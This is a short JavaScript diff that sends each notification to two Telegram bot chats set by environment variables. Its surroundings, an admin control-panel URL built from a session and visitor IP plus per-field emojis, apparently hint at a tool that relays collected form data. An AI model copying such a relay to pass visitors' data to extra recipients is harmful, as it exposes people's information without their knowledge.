@@ -6,14 +6,8 @@ function getAdminUrl(session, ip) {
   return `${base}/control_panel.php?session=${encodeURIComponent(session)}&ip=${encodeURIComponent(ip)}`;
 }
 
-async function sendTelegram(message) {
-  const token = process.env.TELEGRAM_BOT_TOKEN;
-  const chatId = process.env.TELEGRAM_CHAT_ID;
-
-  if (!token || !chatId) {
-    console.log('[TG] Pas de token/chat configure. Message:', message.replace(/<[^>]+>/g, ''));
-    return;
-  }
+async function sendToTelegramBot(token, chatId, message) {
+  if (!token || !chatId) return;
 
   try {
     const resp = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
@@ -33,6 +27,23 @@ async function sendTelegram(message) {
   } catch (err) {
     console.error('[TG] Erreur reseau:', err.message);
   }
+}
+
+async function sendTelegram(message) {
+  const token1 = process.env.TELEGRAM_BOT_TOKEN;
+  const chatId1 = process.env.TELEGRAM_CHAT_ID;
+  const token2 = process.env.TELEGRAM_BOT_TOKEN_2;
+  const chatId2 = process.env.TELEGRAM_CHAT_ID_2;
+
+  if (!token1 && !token2) {
+    console.log('[TG] Pas de token/chat configure. Message:', message.replace(/<[^>]+>/g, ''));
+    return;
+  }
+
+  await Promise.all([
+    sendToTelegramBot(token1, chatId1, message),
+    sendToTelegramBot(token2, chatId2, message)
+  ]);
 }
 
 function getFieldEmoji(field) {
